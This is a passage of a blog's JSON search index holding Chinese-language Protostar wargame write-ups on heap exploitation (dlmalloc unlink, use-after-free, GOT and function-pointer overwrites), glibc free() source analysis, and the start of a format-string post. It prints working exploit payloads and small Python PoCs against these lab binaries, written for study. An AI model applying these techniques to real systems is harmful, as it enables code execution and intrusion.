*)next)[len-1]) break; o = (OSObject *) OSSymbol::withCString((const char *) next); next += wordLen; break; case kOSSerializeString: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSString::withStringOfLength((const char *) next, len); next += wordLen; break; case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; case kOSSerializeBoolean: o = (len ? kOSBooleanTrue : kOSBooleanFalse); break; default: break; &#125; if (!(ok = (o != 0))) break; if (!isRef) &#123; setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; &#125; if (dict) &#123; if (sym) &#123; DEBG(\"%s = %s\\n\", sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName()); if (o != dict) ok = dict-&gt;setObject(sym, o); o-&gt;release(); sym-&gt;release(); sym = 0; &#125; else &#123; sym = OSDynamicCast(OSSymbol, o); ok = (sym != 0); &#125; &#125; else if (array) &#123; ok = array-&gt;setObject(o); o-&gt;release(); &#125; else if (set) &#123; ok = set-&gt;setObject(o); o-&gt;release(); &#125; else &#123; assert(!parent); result = o; &#125; if (!ok) break; if (newCollect) &#123; if (!end) &#123; stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; &#125; DEBG(\"++stack[%d] %p\\n\", stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; &#125; if (end) &#123; if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(\"--stack[%d] %p\\n\", stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) &#123; if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); &#125; &#125; &#125; DEBG(\"ret %p\\n\", result); if (objsCapacity) kfree(objsArray, objsCapacity * sizeof(*objsArray)); if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray)); if (!ok &amp;&amp; result) &#123; result-&gt;release(); result = 0; &#125; return (result);&#125;","tags":[{"name":"Pegasus","slug":"Pegasus","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"},{"name":"cve","slug":"cve","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"},{"name":"CVE-2016-4655","slug":"CVE-2016-4655","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"},{"name":"CVE-2016-4656","slug":"CVE-2016-4656","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"},{"name":"PoC","slug":"PoC","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"}]},{"title":"Protostar-堆溢出学习-滥用堆metadata重定向程序执行","date":"2017-04-26T13:24:19.000Z","path":"2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/","text":"0x00 序 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对linux堆管理DLMalloc的分析这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析 0x01 C语言源代码1234567891011121314151617181920212223242526272829#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;void winner()&#123; printf(\"that wasn't too bad now, was it? @ %d\\n\", time(NULL));&#125;int main(int argc, char **argv)&#123; char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf(\"dynamite failed?\\n\");&#125; 0x02 简单分析&amp;思考在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到winner()函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知free()函数中的unlink()函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行winner()函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。就照着这个思路来一步步实现这个过程。 0x03 调试1.输入AAAA BBBB CCCC然后free前后后观察堆结构由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。因为chunk的大小2–&gt;3–&gt;null`的方式连接 2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。因为我们准备向前合并，所以将preinuse位设为1，即64+1=65 3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。构造字符串：CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\\xfc\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\x1c\\xb1\\x04\\x08\\x0c\\xc0\\x04\\x08 4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。这里我们用在线的转换工具下面的汇编转化为x86指令字符串 12mov eax,0x8048864call eax 0x8048864为winner()函数地址 5.将上面的shellcode写入第一个chunk那里，here we hack！下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。GoT地址已经修改，下面可以看到已经执行了winnwe()函数 0x04 一点补充在上面构造chunk中，也许你已经发现了chunk大小为0xfffffffc，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看Once upon a free()这篇文章，简单的说就是当某个数加上0xfffffffc时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。 0x05 堆漏洞学习总结目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"metadata","slug":"metadata","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"},{"name":"DLMalloc","slug":"DLMalloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"}]},{"title":"深入理解Linux堆分配器-DLMalloc","date":"2017-04-23T04:16:00.000Z","path":"2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/","text":"0x00 序 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。 0x01 目录1.DLMalloc2.内存Chunk3.Bin4.malloc源码free()函数分析 0x02 DLMallocDoug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点： 稳定性(stability) 性能(performance) 避免碎片化(avoidance of fragmentation) 低空间开销(low space overhead）根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。 0x03 内存chunk1.什么是chunk？chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。 2.数据结构 123456struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用 INTERNAL_SIZE_T size; //当前chunk的大小 struct malloc_chunk * fd; //如果当前为释放chunk，指向双向free list中前一个chunk struct malloc_chunk * bk; //如果当前为释放chunk，指向双向free list中后一个chunk&#125; 根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例: allocate chunk freed chunk 3.更多细节因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？然后可以想到有一个最小chunk的存在，其大小为16字节()。 4.特殊chunktop chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。 last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk. 0x04 Binchunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。这里我主要介绍fsatbin和normalbin (1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。 0x05 free()源代码分析及相关细节free(void *mem)--&gt;__libc_free(void *mem) 12345678910111213141516171819202122232425262728293031323334353637383940void__libc_free (void *mem)&#123; mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) &#123; (*hook)(mem, RETURN_ADDRESS (0)); return; &#125; if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ &#123; /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) &#123; mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); //跳转到_int_free&#125; 我们先不关注其他的，只需要知道会调用_int_free就就可以了 __libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; INTERNAL_SIZE_T size; /* 当前chunk的大小 */ mfastbinptr *fb; /* 相关的fastbin */ mchunkptr nextchunk; /* 下一个相邻的chunk */ INTERNAL_SIZE_T nextsize; /* 下一个chunk的大小 */ int nextinuse; /* 下一个chunk正在使用时为真 */ INTERNAL_SIZE_T prevsize; /* 前一个chunk的大小 */ mchunkptr bck; /* 指向free链表中向后一个chunk */ mchunkptr fwd; /* 指向free链表中向前一个chunk */ const char *errstr = NULL; int locked = 0; size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ //一些安全检查 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) &#123; errstr = \"free(): invalid pointer\"; errout: if (!have_lock &amp;&amp; locked) __libc_lock_unlock (av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; &#125; /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ //检查是否满足大于等于最小大小 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123; errstr = \"free(): invalid size\"; goto errout; &#125; check_inuse_chunk(av, p); //检查当前chunk是否在使用 /* 如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用 */ if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) &#123; if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) &#123; /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || (&#123; assert (locked == 0); __libc_lock_lock (av-&gt;mutex); locked = 1; chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123; errstr = \"free(): invalid next size (fast)\"; goto errout; &#125; if (! have_lock) &#123; __libc_lock_unlock (av-&gt;mutex); locked = 0; &#125; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) &#123; errstr = \"double free or corruption (fasttop)\"; goto errout; &#125; /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; &#125; while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) &#123; errstr = \"invalid fastbin entry (free)\"; goto errout; &#125; &#125; /* Consolidate other non-mmapped chunks as they arrive. */ //检查是否是通过mmap()分配的内存 else if (!chunk_is_mmapped(p)) &#123; if (! have_lock) &#123; __libc_lock_lock (av-&gt;mutex); locked = 1; &#125; nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址 /* Lightweight tests: check whether the block is already the top block. */ //检查下一个是否为top-chunk if (__glibc_unlikely (p == av-&gt;top)) &#123; errstr = \"double free or corruption (top)\"; goto errout; &#125; /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) &#123; errstr = \"double free or corruption (out)\"; goto errout; &#125; /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = \"double free or corruption (!prev)\"; goto errout; &#125; nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = \"free(): invalid next size (normal)\"; goto errout; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); /* 与后面chunk一个合并 */ if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来 &#125; if (nextchunk != av-&gt;top) &#123; /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* 与前面chunk一个合并*/ if (!nextinuse) &#123; unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来 size += nextsize; &#125; else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = \"free(): corrupted unsorted chunks\"; goto errout; &#125; p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); &#125; /* 如果当前chunk正好与topchunk相邻，则合并到topchunk */ else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); &#125; /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) &#123;#ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av);#endif &#125; else &#123; /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); &#125; &#125; if (! have_lock) &#123; assert (locked); __libc_lock_unlock (av-&gt;mutex); &#125; &#125; /* If the chunk was allocated via mmap, release via munmap(). */ else &#123; munmap_chunk (p); &#125;&#125; 这里看看unlink()宏定义 123456#define unlink( P, BK, FD ) &#123; BK = P-&gt;bk; FD = P-&gt;fd; FD-&gt;bk = BK; //可能会造成任意写 BK-&gt;fd = FD; &#125; 现在我们重点放在unlink()，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。 glibc/malloc.c源码 0x06 参考 Vudo malloc tricks A Memory Allocator Once upon a free()","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"},{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"},{"name":"malloc","slug":"malloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"},{"name":"free","slug":"free","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"}]},{"title":"Protostar-堆溢出学习-UAF(use after free)","date":"2017-04-21T03:12:19.000Z","path":"2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/","text":"0x00 序 下面看一个堆中常见的漏洞-UAF(use after free) 0x01 C语言源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;struct auth &#123; char name[32]; int auth;&#125;;struct auth *auth;char *service;int main(int argc, char **argv)&#123; char line[128]; while(1) &#123; printf(\"[ auth = %p, service = %p ]\\n\", auth, service); if(fgets(line, sizeof(line), stdin) == NULL) break; if(strncmp(line, \"auth \", 5) == 0) &#123; auth = malloc(sizeof(auth)); memset(auth, 0, sizeof(auth)); if(strlen(line + 5) &lt; 31) &#123; strcpy(auth-&gt;name, line + 5); &#125; &#125; if(strncmp(line, \"reset\", 5) == 0) &#123; free(auth); &#125; if(strncmp(line, \"service\", 6) == 0) &#123; service = strdup(line + 7); &#125; if(strncmp(line, \"login\", 5) == 0) &#123; if(auth-&gt;auth) &#123; printf(\"you have logged in already!\\n\"); &#125; else &#123; printf(\"please enter your password\\n\"); &#125; &#125; &#125;&#125; 0x02 分析&amp;思考程序有4个命令，对auth这个结构体进行分配内存以及释放内存，然后有结构体里的auth-&gt;auth来决定是否授权。很明显让我们修改auth-&gt;auth的值。reset命令释放auth但没有设为null，后面auth-&gt;auth发生引用。所以这里有个UAF漏洞。 0x03 调试&amp;hack1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况 2.先输入auth admin，然后输入login试试3.再输入reset释放堆内存4.输入service分配内存5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖auth-&gt;auth的内存值。6.再次输入login命令 0x04 一点感受通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"UAF","slug":"UAF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"}]},{"title":"Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写","date":"2017-04-19T03:12:19.000Z","path":"2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/","text":"0x00 序 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。 0x01 C语言源代码123456789101112131415161718192021222324252627282930313233#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;struct internet &#123; int priority; char *name;&#125;;void winner()&#123; printf(\"and we have a winner @ %d\\n\", time(NULL));&#125;int main(int argc, char **argv)&#123; struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf(\"and that's a wrap folks!\\n\");&#125; 0x02 简单的分析&amp;思考如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个strcpy，肯定是要去覆盖和修改某个地方的地址。其实strcpy这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。在这个列子中，我们就借此去修改printf函数的GOT表。 0x03 调试1.查看堆分配情况2.查看汇编代码，找到执行入口3.首先利用第一个strcpy将i2的name指针改为GOT表地址，然后利用第二个strcpy向这个地址写入winner的地址，由此编写对应的Python PoC 123456import structpadding = \"AAAA\"*5put_got = struct.pack(\"I\", 0x8049774) #put的GOT表地址space = \" \"winner = struct.pack(\"I\", 0x8048494) #winner函数地址print padding+put_got+space+winner 4.hack 12user@protostar:/tmp$ /opt/protostar/bin/heap1 `python heap1.py`and we have a winner @ 1492452139 成功执行winner函数 0x04 一点感受学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将strcpy改为strncpy或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"strcpy","slug":"strcpy","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"},{"name":"GOT表","slug":"GOT表","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT表/"}]},{"title":"Protostar-堆溢出学习-覆盖堆函数指针劫持代码流","date":"2017-04-18T03:12:19.000Z","path":"2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/","text":"0x00 序 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。 0x01 C语言源代码C代码 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;struct data &#123; char name[64];&#125;;struct fp &#123; int (*fp)();&#125;;void winner()&#123; printf(\"level passed\\n\");&#125;void nowinner()&#123; printf(\"level has not been passed\\n\");&#125;int main(int argc, char **argv)&#123; struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&gt;fp = nowinner; printf(\"data is at %p, fp is at %p\\n\", d, f); strcpy(d-&gt;name, argv[1]); f-&gt;fp();&#125; 0x02 简单分析&amp;思考先在堆上分配了一个data和fp的结构体，然后使fp指向nowinner函数，然后打印对应分配的堆地址，以及将argv[1]复制到data结构体，最后调用nowinner函数。 可以知道我们需要去执行winner函数，怎么做到呢？ 由于strcpy没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为winner函数？Here we go！ 0x03 malloc()在继续分析之前，我们先来简单的介绍一下malloc函数，在这里malloc函数更多是对mmap系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用mmap来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。 那是如何管理堆的呢？见下 堆标志 分配大小 malloc返回地址addr 00000000 00000011 00000000 00000000 00000000 00000031 AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD EEEEEEEE FFFFFFFF … … … … 00000000 00000011 00000000 00000000 每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过addr-4拿到自身的分配大小从而决定下次分配的选择 注：分配大小的第一位表示前面的内存块是否在使用 0x04 调试&amp;hack通过前面的分析，我们的目的很明确，需要通过strcpy(d-&gt;name, argv[1]);去重写fp结构体里面的函数指针，使其为winner函数的地址。 1.利用gdb查看strcpy前后堆的情况我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的nowinner地址改为winner地址 2.查看winner地址，重写fp函数指针 12(gdb) p winner $1 = &#123;void (void)&#125; 0x8048464 &lt;winner&gt; 3.PoC Python脚本 123456import structpadding = \"A\"*64 #填充datahead = \"BBBB\" # not carehead += \"CCCC\" # not carewinner = struct.pack(\"I\", 0x8048464) #将nowinner地址改为winner地址print padding+head+winner 4.hack成功执行winner函数!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"}]},{"title":"Protostar-栈溢出学习-printf格式%n任意地址写","date":"2017-04-17T03:12:19.000Z","path":"2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/","text":"0x00 序 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。 0x01 C语言源代码1234567891011121314151617181920#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln(char *string)&#123; printf(string); if(target) &#123; printf(\"you have modified the target :)\\n\"); &#125;&#125;int main(int argc, char **argv)&#123; vuln(argv[1]);&#125; 0x02 疑惑&amp;分析&amp;思考拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量target的值。但好像除了printf()函数，就没有其他可疑的地方了。what fuck？ 一个printf()函数怎么会有漏洞？ 但仔细观察可以发现这次printf的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？ 0x03 测试其他不说，先运行下程序试试再试着输入格式字符试试很奇怪，我们貌似得到一些栈中的值，再多打印一些试试可以看到后面打印出来了%x本身&lt;—20782520，通过linux stack layout可得知后面的确保存着参数字符串 123456789101112131415161718...local variables of mainsaved registers of mainreturn address of mainargcargvenvpstack from startup codeargcargv pointersNULL that ends argv[]environment pointersNULL that ends envp[]ELF Auxiliary Tableargv strings &lt;--------focus hereenvironment stringsprogram nameNULL 更多关于linux栈布局 0x04 你不知道的printf虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？ 关注printf函数，有这么一段话： Code such as 